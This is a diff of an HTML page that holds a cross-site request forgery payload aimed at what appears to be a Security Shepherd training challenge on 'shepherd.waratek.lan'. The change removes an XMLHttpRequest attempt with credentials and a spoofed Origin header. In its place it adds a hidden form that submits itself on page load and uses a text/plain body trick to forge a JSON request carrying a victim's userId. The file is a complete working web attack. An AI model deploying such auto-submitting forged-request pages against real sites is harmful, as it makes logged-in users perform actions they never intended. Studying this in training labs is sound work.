@@ -5,43 +5,17 @@
     </head>
 
     <body>
-<!--    
-        <form id="csrf" action="https://shepherd.waratek.lan/user/csrfchallengefour/plusplus" method="POST" >
-            <input type="hidden" name="userId" value="fcab4e7dfbe01ce4e3904b97febe6a6a184302c3" />
-            <input type="hidden" name="csrfToken" value="138480911391839065120583091695078570809" />
+   
+        <form id='csrf' action='https://shepherd.waratek.lan/user/csrfchallengejson/plusplus' method='POST' enctype='text/plain'>
+            <input type='hidden' name='{"userId": "fcab4e7dfbe01ce4e3904b97febe6a6a184302c3", "ignore": "' value='"}' />
         </form> 
--->
+
 
         <script>
             (function () {
-//                 var form = document.getElementById("csrf");
-//                 form.submit();
-                
-                var cb = function (res) {
-                    console.log('Callback Invoked', res);
-                }
-                
-                var url = 'https://shepherd.waratek.lan/user/csrfchallengejson/plusplus';
-                var body = '{"userId":"fcab4e7dfbe01ce4e3904b97febe6a6a184302c3"}';
-                
-                doPost(url, body, cb);
-                
-            })();
-                      
-            function doPost(url, data, callback) {
-                var req = new XMLHttpRequest();
-                req.onreadystatechange = function () {
-                    if (req.readyState === 4 && req.status === 200)
-                        callback(req.responseText);
-                };
-                req.open("POST", url, true);
-                req.withCredentials = true;
-                req.setRequestHeader("X-Requested-With","");
-                req.setRequestHeader("Origin", "https://shepherd.waratek.lan");
-                req.send(data);
-                return req.responseText;
-            };
-            
+                var form = document.getElementById("csrf");
+                form.submit();
+            })();           
         </script>
     </body>
 </html>
